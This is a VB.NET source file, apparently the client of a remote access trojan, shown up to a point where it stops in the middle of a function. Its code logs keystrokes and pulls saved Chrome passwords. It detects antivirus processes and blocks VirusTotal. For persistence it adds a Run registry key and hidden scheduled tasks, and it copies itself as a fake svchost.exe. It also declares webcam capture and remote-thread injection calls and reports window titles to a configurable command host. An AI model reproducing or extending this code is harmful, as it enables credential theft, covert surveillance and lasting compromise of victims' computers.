Imports System.Globalization
Imports System.IO
Imports System.Text
Imports System.Net, System.Net.Sockets, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, System.Runtime.InteropServices, Microsoft.Win32
Imports System.Environment
Imports System.Management, System.CodeDom.Compiler, System.Reflection, System.DirectoryServices, System.IO.File, System.IO.FileStream, System.Runtime.InteropServices.ComTypes, System.Text.RegularExpressions, System.Drawing.Imaging, System.ServiceProcess, System.Net.NetworkInformation, System.Drawing.Drawing2D, Microsoft.VisualBasic.Devices, System.Security.Cryptography
Imports System.Diagnostics
Public Class q
    Dim efkjws As String = "C:\Windows\System32\drivers\etc\hosts"
    Dim saw As StreamWriter
    Dim sco$
    Dim Screamhi$
    Dim picBox As New PictureBox
    Dim AC$
    Private msvc As ServiceController
    Dim tio$
    Private controllers As New System.Collections.Generic.SortedList(Of String, ServiceController)
    Dim ero# = 1
    Public Enum ThreadAccess As Integer
        TERMINATE = (&H1)
        SUSPEND_RESUME = (&H2)
        GET_CONTEXT = (&H8)
        SET_CONTEXT = (&H10)
        SET_INFORMATION = (&H20)
        QUERY_INFORMATION = (&H40)
        SET_THREAD_TOKEN = (&H80)
        IMPERSONATE = (&H100)
        DIRECT_IMPERSONATION = (&H200)
    End Enum
    <System.Runtime.InteropServices.DllImport("user32")>
    Public Shared Function GetAsyncKeyState(ByVal xxx As System.Windows.Forms.Keys) As Short
    End Function
    Public Delegate Function CallBack(ByVal hwnd As Integer, ByVal lParam As Integer) As Boolean
    Public Declare Function EnumWindows Lib "user32" (ByVal Adress As CallBack, ByVal y As Integer) As Integer
    Public Declare Function IsWindowVisible Lib "user32.dll" (ByVal hwnd As IntPtr) As Boolean
    Private Const SW_HIDE As Integer = 0
    Private Const SW_RESTORE As Integer = 9
    Private hWnd As Integer
    Public selectedIndex As Integer
    Private ActiveWindows As New System.Collections.ObjectModel.Collection(Of IntPtr)
    <DllImport("User32")> Private Shared Function ShowWindowe(ByVal hwnd As Integer, ByVal nCmdShow As Integer) As Integer
    End Function
    Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Integer, ByVal lpWindowText As String, ByVal cch As Integer) As Integer
    Public Declare Function OpenThread Lib "kernel32.dll" (ByVal dwDesiredAccess As ThreadAccess, ByVal bInheritHandle As Boolean, ByVal dwThreadId As UInteger) As IntPtr
    Public Declare Function SuspendThread Lib "kernel32.dll" (ByVal hThread As IntPtr) As UInteger
    Public Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As IntPtr) As UInteger
    Public Declare Function CloseHandle Lib "kernel32.dll" (ByVal hHandle As IntPtr) As Boolean
    Public GetProcesses() As Process
    Private strUninstallStrings() As String
    Private NewUninstallStrArr
    Public Declare Function GetAsyncKeyState Lib "user32.dll" (ByVal key As Integer) As Integer
    Private Declare Function mmciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
    Dim TextBox13 As New TextBox
    Dim TextBox12 As New TextBox
    Dim TextBox8 As New TextBox
    Dim TextB As New TextBox
    Dim zoooom As New TextBox
    Private Declare Function SHEmptyRecycleBin Lib "shell32.dll" Alias "SHEmptyRecycleBinA" (ByVal hWnd As Int32, ByVal pszRootPath As String, ByVal dwFlags As Int32) As Int32
    Private Declare Function SHUpdateRecycleBinIcon Lib "shell32.dll" () As Int32
    Private Const SHERB_NOCONFIRMATION = &H1
    Private Const SHERB_NOPROGRESSUI = &H2
    Private Const SHERB_NOSOUND = &H4
    Dim PersistThread As Thread
    Public WithEvents Comet As New k
    Public Yy As String = "|U|"
    Public HOST As String
    Public port As Integer
    Public name As String

    Public cmds As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\i" + System.Environment.UserName + ".inf"
    Dim ewfwasefds As New TextBox
    Dim ewfwasefds1 As New TextBox
    Dim ewfwasefds2 As New TextBox
    Public copyse As Boolean = 0
    Public Ver As String = "0.1.4.0"
    Public virustotal As String = 0
    Dim Devices As Object, Grafikadapter As String, RegionA As String = "SELECT * FROM Win32_VideoController"
    Public task As String = 0
    Public proh As String = 0
    Public avira As String = 0
    Private iwE As String = Environment.GetEnvironmentVariable("windir", EnvironmentVariableTarget.Machine)
    Public av As String = 0
    Public css, tcs, dta, hidme, melt, temp1, temp2, tr1, sys1, sys2, tr2, CheckBox31, TextBox11, CheckBox32, CheckBox28 As Object
    Const key As String = "pSILlzCez34GFHGHwXBSrQ1Vb72t6bIXyedstKRzAHJklNNL94gD8hIi9FwLiiVlr"
    Public a1 As String = 0
    Public a2 As String = 0
    Public a3 As String = 0
    Public a4 As String = 0
    Public a5 As String = 0
    Public a6 As String = 0
    Public a7 As String = 0
    Public a8 As String = 0
    Public a9 As String = 0
    Public Declare Function SendMessageW Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    Const TASKBAR_SHOW As Integer = &H40
    Const TASKBAR_HIDE As Integer = &H80
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Public tictoc As Integer = 0
    Delegate Sub chatappd(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)
    Public MutexX As String = "LIUHLIpiuhFRiuhjUFGIRkufhrifUYF"
    Public Priss As String = 0
    Public EXENAME As String = "68465df648rg6684e62dz5d5z8g4tg4t84yj6ki4jr"
    Public AddREg As String = 0
    Public Myinstal As String = "AppData"
    Public Usb11 As String = 0
    Public proz As String = 0
    Public kl As New VIOD
    Dim tt As New AntiTaskManager
    Public us As String = 0
    Public proa As String = 0
    Public proE As String = 0
    Public pror As String = 0
    Private Const SW_SHOWNORMAL As Integer = 1
    Private Const SW_SHOWMINIMIZED As Integer = 2
    Private Declare Function ShowWindow Lib "user32" (ByVal handle As IntPtr, ByVal nCmdShow As Integer) As Integer
    Private Const SW_SHOWMAXIMIZED As Integer = 3
    Public No As String = 0
    Private Declare Function BlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Private Declare Function ShowCursor Lib "user32" (ByVal lShow As Long) As Long
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    Public sernam As String
    Public addtos As Boolean = 0
    Public StartupKey As String
    Public melts As Boolean = 0
    Public pw As String
    Public cap As New r
    Public caa As New CRDP1
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)
    Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Dim taskBar As Integer = FindWindow("Shell_traywnd", "")
    Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpCommandString As String, ByVal lpReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private makel As String
    Dim text1, text2, namev, flder, RG As String
    Const spl = "abccba"
    Dim PictureBox1 As Windows.Forms.PictureBox
    Dim streamWebcam As Boolean = False
    Public loggg As String
    Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32
    Public xxx As Integer
    Dim id As String = "76487-337-8429955-22614"
    Private pfnStartAddr As Integer
    Public Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (
    ByVal lpLibFileName As String) As Integer
    Public Declare Function GetProcAddress Lib "kernel32" (
    ByVal hModule As Integer, ByVal lpProcName As String) As Integer
    Public screamx As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".wav"
    Public scream As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".ini"
    Public hid As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".E"
    Public S762 As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
    Public Declare Function CreateRemoteThread Lib "kernel32" (
    ByVal hProcess As Integer,
    ByVal lpThreadAttributes As Integer,
    ByVal dwStackSize As Integer,
    ByVal lpStartAddress As Integer,
    ByVal lpParameter As Integer,
    ByVal dwCreationFlags As Integer,
    ByRef lpThreadId As Integer) As Integer
    Public ooo As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".jpg"
    Public LogsPathsoo As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".log"
    'Public HostPort As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".Microsoft"
    Public Structure CLIENT_ID
        Dim UniqueProcess As Long
        Dim UniqueThread As Long
    End Structure
    Private Declare Function RtlCreateUserThread Lib "ntdll.dll" (ByVal hProcess As Long,
                                                                  ByRef ThreadSecurityDescriptor As Integer,
                                                                  ByVal CreateSuspended As Long,
                                                                  ByVal ZeroBits As Long,
                                                                  ByVal MaximumStackSize As Long,
                                                                  ByVal CommittedStackSize As Long,
                                                                  ByVal StartAddress As Long,
                                                                  ByVal Parameter As Long,
                                                                  ByRef hThread As Long,
                                                                  ByRef ClientId As CLIENT_ID) As Long
    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function
    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs)
        On Error Resume Next
        Process.Start(Application.ExecutablePath)
    End Sub
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs)
        On Error Resume Next
        Process.Start(Application.ExecutablePath)
    End Sub
    Function getanti()
        Dim antivirus As String
        Dim procList() As Process = Process.GetProcesses()
        Dim i As Integer = 0
        Do
            Dim strProcName As String = procList(i).ProcessName
            If strProcName = "ekrn" Then
                antivirus = "NOD32"
            ElseIf strProcName = "avgcc" Then
                antivirus = "AVG"
            ElseIf strProcName = "avgnt" Then
                antivirus = "Avira"
            ElseIf strProcName = "QHWatchdog" Then
                antivirus = "Total Security 360"

            ElseIf strProcName = "ahnsd" Then
                antivirus = "AhnLab-V3"
            ElseIf strProcName = "bdss" Then
                antivirus = "BitDefender"
            ElseIf strProcName = "bdv" Then
                antivirus = "ByteHero"
            ElseIf strProcName = "clamav" Then
                antivirus = "ClamAV"
            ElseIf strProcName = "fpavserver" Then
                antivirus = "F-Prot"
            ElseIf strProcName = "fssm32" Then
                antivirus = "F-Secure"
            ElseIf strProcName = "avkcl" Then
                antivirus = "GData"
            ElseIf strProcName = "engface" Then
                antivirus = "Jiangmin"
            ElseIf strProcName = "avp" Then
                antivirus = "Kaspersky"
            ElseIf strProcName = "updaterui" Then
                antivirus = "McAfee"
            ElseIf strProcName = "msmpeng" Then
                antivirus = "microsoft security essentials"
            ElseIf strProcName = "zanda" Then
                antivirus = "Norman"
            ElseIf strProcName = "npupdate" Then
                antivirus = "nProtect"
            ElseIf strProcName = "inicio" Then
                antivirus = "Panda"
            ElseIf strProcName = "sagui" Then
                antivirus = "Prevx"
            ElseIf strProcName = "savservice" Then
                antivirus = "Sophos"
            ElseIf strProcName = "saswinlo" Then
                antivirus = "SUPERAntiSpyware"
            ElseIf strProcName = "spbbcsvc" Then
                antivirus = "Symantec"
            ElseIf strProcName = "thd32" Then
                antivirus = "TheHacker"
            ElseIf strProcName = "ufseagnt" Then
                antivirus = "TrendMicro"
            ElseIf strProcName = "dllhook" Then
                antivirus = "VBA32"
            ElseIf strProcName = "sbamtray" Then
                antivirus = "VIPRE"
            ElseIf strProcName = "vrmonsvc" Then
                antivirus = "ViRobot"
            ElseIf strProcName = "dllhook" Then
                antivirus = "VBA32"
            ElseIf strProcName = "vbcalrt" Then
                antivirus = "VirusBuster"
            ElseIf strProcName = "aswUpdSv" Then
                antivirus = "Avast"
            Else
                antivirus = "Not Found"
            End If
            Dim iProcID As Integer = procList(i).Id
            i = i + 1
        Loop Until (antivirus <> "Not Found" Or i > procList.Length - 1)
        If i > procList.Length - 1 Then
            antivirus = "Not Found"
        End If
        Return antivirus
    End Function
    Public Function GetActiveWindows() As ObjectModel.Collection(Of IntPtr)
        AC = ""
        EnumWindows(AddressOf Enumerator, 0)
        Return ActiveWindows
    End Function
    Private Function Enumerator(ByVal hwnd As IntPtr, ByVal lParam As Integer) As Boolean
        Dim text As String = Space(Int16.MaxValue)
        If IsWindowVisible(hwnd) Then
            GetWindowText(hwnd, text, Int16.MaxValue)
            AC = text
            Dim sl As String = "ProcessSplit"
            Dim RFC$
            RFC = AC + sl
            Comet.Send("ACs" & Yy & RFC)
        End If
        Return True
    End Function

    Public Sub GetChrome()
        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"
        Try
            zoooom.Text = ""
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim host, user, pass As String

                For i = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    host = SQLDatabase.GetValue(i, "origin_url")
                    user = SQLDatabase.GetValue(i, "username_value")
                    pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))

                    If (user <> "") And (pass <> "") Then
                        cPass = ("============ Chrome ==============" & vbNewLine & "link: ---> " & host & vbNewLine & "Account: ---> " & user & vbNewLine & "password: ---> " & pass & vbNewLine & "=============================" & vbNewLine _
                        & vbNewLine & " ")
                        zoooom.Text += cPass
                    End If
                Next

            End If
        Catch e As Exception
            MsgBox(e.ToString)
        End Try
    End Sub
    Public Function GenerateOperatingSystema() As String
        Dim xa As String
        If Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString.Contains("x64") Then
            xa = "32 Bit"
        Else
            xa = "64 Bit"
        End If
        Return xa
    End Function
    Public Function GenerateOperatingSystem() As String
        Dim xa As String
        If Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString.Contains("x86") Then
            xa = "32 Bit"
        Else
            xa = "64 Bit"
        End If
        Return xa
    End Function
    Sub screamhelp()
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.FixedToolWindow
        Me.Hide()
        Me.ShowInTaskbar = False
        Me.ShowIcon = False


        'My.Settings.Reload()
        If x60 Then
            If GenerateOperatingSystem() = "32 Bit" Then
                'MsgBox("1")
            Else
                End
            End If
        End If
        If x61 Then
            If GenerateOperatingSystema() = "64 Bit" Then
                'MsgBox("1")
            Else
                End
            End If
        End If

        If My.Settings.ho = "" Then
            HOST = x1
        Else
            Dim TOFc1$ = My.Settings.ho
            HOST = TOFc1

        End If

        If My.Settings.po = "" Then
            port = x2
        Else
            Dim TOFc2$ = My.Settings.po
            port = TOFc2

        End If




        If File.Exists(scream) Then
            Dim XKL As String
            XKL = System.IO.File.ReadAllText(scream)
            name = XKL
            If XKL = "" Then name = x3
        Else
            name = x3
        End If

        TextBox4.Text = name

        copyse = x4
        sernam = x5
        addtos = x6
        StartupKey = x7
        melts = x8
        pw = x9
        task = x10
        us = x11
        proE = x12
        proh = x13
        proa = x14
        proz = x15
        pror = x16
        virustotal = x17
        Try
            MutexX = x18
            Priss = x19
            EXENAME = x20
            AddREg = x21
            Myinstal = x22
            avira = x23
            dta = x24
            css = x25
            tcs = x26
            namev = x27
            flder = x28
            hidme = x29
            melt = x30
            temp1 = x31
            temp2 = x32
            tr1 = x33
            sys1 = x34
            sys2 = x35
            tr2 = x36
            Usb11 = x37
            a1 = x38
            a2 = x39
            a3 = x40
            a4 = x41
            a5 = x42
            a6 = x43
            av = x44
            a7 = x45
            a8 = x46
            a9 = x47
            CheckBox31 = x48
            TextBox11 = x49
            CheckBox32 = x50
            CheckBox28 = x51
            TextBox13.Text = x52
            TextBox8.Text = x53
            TextBox12.Text = x54
        Catch ex As Exception
        End Try
        If x57 Then
            TextBox3.Text += 1
            My.Computer.FileSystem.WriteAllText(hid, TextBox3.Text, False)
            If TextBox3.Text >= x58 Then
            Else
                End
            End If
        End If
        If CheckBox31 Then
            TextBox2.Text = TextBox11
            Threading.Thread.Sleep(TextBox2.Text)
        End If
        If Priss Then
            PersistThread = New Thread(AddressOf Persist)
            PersistThread.IsBackground = True : PersistThread.Start(StartupKey)
        End If
        Try
            System.Threading.Mutex.OpenExisting(MutexX) : End
        Catch
            Dim mutex As New Mutex(False, MutexX)
        End Try
        If CheckBox28 Then
            Try
                Dim d As String

                d = System.Environment.UserName
                TextBox12.Text = TextBox12.Text.Replace("?", d)
                If File.Exists(TextBox12.Text) Then
                Else
                    If x55 = "" Then
                        File.Copy(Application.ExecutablePath, TextBox12.Text)
                        System.IO.File.SetAttributes(TextBox12.Text, IO.FileAttributes.Hidden)
                        If x56 Then
                            Shell("schtasks /create /sc minute /" + TextBox8.Text + " /tn " + TextBox13.Text + " /tr " & TextBox12.Text, AppWinStyle.Hide)

                        Else
                            Shell("SchTasks /Create /SC DAILY /TN " + TextBox13.Text + " /TR " + TextBox12.Text + " /" + TextBox8.Text, AppWinStyle.Hide)

                        End If
                    Else
                        Dim ds As String

                        ds = System.Environment.UserName
                        x55 = x55.Replace("?", ds)
                        System.IO.Directory.CreateDirectory(x55)
                        File.Copy(Application.ExecutablePath, TextBox12.Text)
                        System.IO.File.SetAttributes(TextBox12.Text, IO.FileAttributes.Hidden)
                        If x56 Then
                            Shell("schtasks /create /sc minute /" + TextBox8.Text + " /tn " + TextBox13.Text + " /tr " & TextBox12.Text, AppWinStyle.Hide)

                        Else
                            Shell("SchTasks /Create /SC DAILY /TN " + TextBox13.Text + " /TR " + TextBox12.Text + " /" + TextBox8.Text, AppWinStyle.Hide)

                        End If
                    End If
                End If
            Catch ex As Exception
            End Try
        End If
        If CheckBox32 Then
            Try
                Dim StartupKey As String = namev
                Dim regKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("software\microsoft\windows\currentversion\run", True)
                regKey.SetValue(StartupKey, Application.ExecutablePath, Microsoft.Win32.RegistryValueKind.String) : regKey.Close()
            Catch : End Try
        End If
        Me.FormBorderStyle = Windows.Forms.FormBorderStyle.FixedToolWindow
        Me.ShowInTaskbar = False
        Me.Hide()
        Me.Visible = False
        kl.Start()
        name = name & "_" & HWD()

        Timer2.Enabled = True
        If a9 Then
            Timer17.Start()
        End If
        If a8 Then
            Timer16.Start()
        End If
        If a7 Then
            Timer15.Start()
        End If
        If av Then
            AVG()
        End If
        If a1 Then
            Timer9.Start()
        End If
        If a2 Then
            Timer10.Start()
        End If
        If a3 Then
            Timer11.Start()
        End If
        If a4 Then
            Timer12.Start()
        End If
        If a5 Then
            Timer13.Start()
        End If
        If a6 Then
            Timer14.Start()
        End If
        If Usb11 Then
            Timer8.Start()
        End If
        If avira Then
            Dim T As New Threading.Thread(AddressOf BA)
            T.IsBackground = True
            T.Start()
        End If
        If us Then
            Dim usb As New USB
            usb.Start()
        End If
        If virustotal Then
            virustotal1.Block("virustotal")
        End If
        If pror Then
            Timer7.Start()
        End If
        If proh Then
            Timer4.Start()
        End If
        If proz Then
            Timer6.Start()
        End If
        If proa Then
            Timer5.Start()
        End If
        If proE Then
            Timer3.Start()
        End If
        If hidme Then
            File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)
        End If
        Dim ProgramFiles1 As String = GetFolderPath(SpecialFolder.Programs)
        If sys1 Then
            Directory.CreateDirectory(ProgramFiles1 & "\" & flder)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & flder & "\" & namev)
                    End
                End If
            End If
        End If
        '
        If sys2 Then

            Directory.CreateDirectory(ProgramFiles1 & "\" & tr2)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Programs) & "\" & tr2 & "\" & namev)
                    End
                End If
            End If
        End If

        Dim temp As String = GetFolderPath(SpecialFolder.Templates)
        If temp1 Then
            Directory.CreateDirectory(temp & "\" & flder)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & flder & "\" & namev)
                    End
                End If
            End If
        End If
        If temp2 Then
            Directory.CreateDirectory(temp & "\" & tr1)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & tr1 & "\" & namev)
                    End
                End If
            End If
        End If

        Dim appData As String = GetFolderPath(SpecialFolder.ApplicationData)
        If dta Then
            Directory.CreateDirectory(appData & "\" & flder)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & flder & "\" & namev)
                    End
                End If
            End If
        End If
        If css Then
            Directory.CreateDirectory(appData & "\" & tcs)
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                End If
            Else
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(Path.GetTempPath & "melt.txt") : Catch : End Try
                End If
                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev) Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev) : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev)

                Else
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev)
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
                    Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & tcs & "\" & namev)
                    End
                End If
            End If
        End If

        If melts Then
            If Application.ExecutablePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe" Then
                If File.Exists(Path.GetTempPath & "melt.txt") Then
                    Try : IO.File.Delete(IO.File.ReadAllText(Path.GetTempPath & "melt.txt")) : Catch : End Try
                End If
            Else

                If File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") Then
                    Try : IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe") : Catch : End Try
                    IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Microsoft\svchost.exe")
                    IO.File.WriteAllText(Path.GetTempPath & "melt.txt", Application.ExecutablePath)
